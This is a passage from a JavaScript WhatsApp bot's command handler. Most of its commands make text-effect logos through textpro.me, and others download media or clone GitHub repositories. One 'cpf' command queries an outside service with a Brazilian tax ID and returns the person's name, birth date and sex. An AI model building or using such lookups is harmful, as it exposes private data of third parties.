    .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
    .catch((err) => console.log(err));
     break

case 'lion2':
  if(!q) throw `Use ${prefix + command} text`
  m.reply(mess.wait)
  maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
      `${q}`,])
     .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
     .catch((err) => console.log(err));
     break

case 'papercut':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
         .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
         .catch((err) => console.log(err));
         break

case 'transformer':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break
   
case 'harrypot':
       if(!q) throw `Use ${prefix + command} text|text`
       m.reply(mess.wait)
       teks1 = q.split("|")[0]
       teks2 = q.split("|")[1]
       maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
 .catch((err) => console.log(err));
 break

case 'neondevil':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
         .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
         .catch((err) => console.log(err));
         break

case '3dstone':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3davengers':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'thunder':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
case 'window':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

   case 'blackpinkneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-neon-light-blackpink-logo-text-effect-online-1081.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'graffiti':
   case 'grafiti':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'pornhub2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'blackpink2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch2':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch3':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dspace':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'lion':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'neon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-text-effect-online-879.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'greenneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/green-neon-text-effect-874.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
    
case 'bokeh':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
   

case 'holographic':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break



case 'bear':

if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'wolf':

if(!q) throw `Use ${prefix + command} text`
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'joker':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-joker-online-934.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'dropwater2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
   case 'summertime':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-summer-neon-light-text-effect-online-1076.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'neonlight2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'thewall':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
case 'natural':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 

case 'carbon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'pencil':
if(!q) throw`Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'textmaker': {
   
if (args.length < 1) throw `Example :\n${prefix + command} <name>`
if (args[0] === 'glitch') {
if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
let teds = await thiccysapi.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [args[1]])
client.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
} else if (args[0] === 'glow') {
if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
let teds = await thiccysapi.textpro("https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html", [args[1]])
client.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
} else {
m.reply(`*Text Maker List :*\n•> glitch\n•> glow`)
}
}
break
//logo maker
case 'hoorror':{

     let link = `https://textpro.me/horror-blood-text-effect-online-883.html`
     let anui = await textpro(link, q)
     m.reply(`Wait a moment while making the logo about 1 minute`) 
     console.log(anui)
    client.sendMessage(from, {image:{url:anui}, caption:"Here you go!"}, {quoted:m})
}
   break
case 'whitebear':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'thunder2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-thunder-text-effect-online-881.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   break
case 'blackpink':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'neon':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-online-882.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'matrix2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/matrix-style-text-effect-online-884.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sky':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'magma':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-magma-hot-text-effect-online-1030.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sand':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'pencil':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'graffiti':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'metallic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'steel':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'harrpotter':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'underwater':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-underwater-text-effect-generator-online-1013.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'luxury':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-luxury-gold-text-effect-online-1003.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'glue2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'fabric':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'neonlight':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-glitch-text-generator-online-1063.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'lava':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/lava-text-effect-online-914.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'toxic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/toxic-text-effect-online-901.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'ancient':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'christmas2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sparkles-merry-christmas-text-effect-1054.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sci_fi':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'rainbow':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'classic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'watercolor2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'halloweem2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-spooky-halloween-text-effect-online-1046.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'halloweenfire':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/halloween-fire-text-effect-940.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'writing':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'foggy':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'marvel':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'skeleton2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sketch':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'wonderful':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'cool':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'collwall':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-cool-wall-graffiti-text-effect-online-1009.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'multicolor2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'batman':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'juice':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/fruit-juice-text-effect-861.html", [
    `${q}`,])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'pornhub':{
	
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anu = await textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
console.log(anu)
client.sendMessage(from,{image:{url:anu}, caption:"Here you go!"},{quoted:m})
}
break
case 'retro':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anu = await textpro("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
console.log(anu)
client.sendMessage(from,{image:{url:anu}, caption:"Here you go!"},{quoted:m})
}
break
case 'horror':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anu = await textpro("https://textpro.me/create-a-cinematic-horror-text-effect-1045.html", [`${logo4}`,`${logo9}`])
console.log(anu)
client.sendMessage(from,{image:{url:anu}, caption:"Here you go!"},{quoted:m})
}
break
case '8bit':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anu = await textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
console.log(anu)
client.sendMessage(from,{image:{url:anu}, caption:"Here you go!"},{quoted:m})
}
break
case 'mediafire': {
if (!text) throw mess.linkm
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw `The link you provided is invalid`
const { mediafireDl } = require('./lib/mediafire.js')
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 999) return m.reply('*File Over Limit* '+util.format(baby1))
const result4 = `*MEDIAFIRE DOWNLOADER*
				
*Nome* : ${baby1[0].nama}
*Tamanho* : ${baby1[0].size}
*Tipo* : ${baby1[0].mime}
*Link* : ${baby1[0].link}`
m.reply(`${result4}`)
client.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
}
break
            case 'soundcloud': case 'scdl': {               
if (!text) throw mess.linkm
if (!isUrl(args[0]) && !args[0].includes('soundcloud.com')) throw `*Not a soundcloud link*`
xfar.SoundCloud(`${text}`).then(async (data) => {
  let txt = `*SOUNDCLOUD DOWNLOADER*\n\n`
  txt += `*⫹⫺Title :* ${data.title}\n`
  txt += `*⫹⫺Quality :* ${data.medias[0].quality}\n`
  txt += `*⫹⫺Type :* ${data.medias[0].extension}\n`
  txt += `*⫹⫺Size :* ${data.medias[0].formattedSize}\n`
  txt += `*⫹⫺Url Source :* ${data.url}\n\n`
  txt += `*${botname}*`
buf = await getBuffer(data.thumbnail)   
client.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${txt}` }, { quoted: m }).catch((err) => m.reply(mess.error))    
client.sendMessage(m.chat, { audio: { url: data.medias[0].url }, mimetype: 'audio/mpeg', fileName: data.title+'.m4a' }, { quoted: m })
}).catch((err) => {
  m.reply(mess.error)
})
            }
            break
            
case 'git': case 'gitclone':
	m.reply(mess.wait)
            let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
            if (!args[0]) throw `Use ${prefix}gitclone repo link\nExample: https://github.com/DGXeon/CheemsBot-MD4`
    if (!regex1.test(args[0])) throw mess.linkm
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    client.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => m.reply(mess.error))
    break
    case 'cpf':{
        cpfy = await fetchJson(`http://onlyfans.rardebuseta.tk/?type=cpf1&query=${q}`)
        cpf = `< Consulta CPF Básica >
    
    - Nome: ${cpfy.result.name}
    - Nascimento: ${cpfy.result.nascimento}
    - Sexo: ${cpfy.result.sexo}
    `
    m.reply(cpf)
        }
        break
        case 'cep':{
            datai = [];
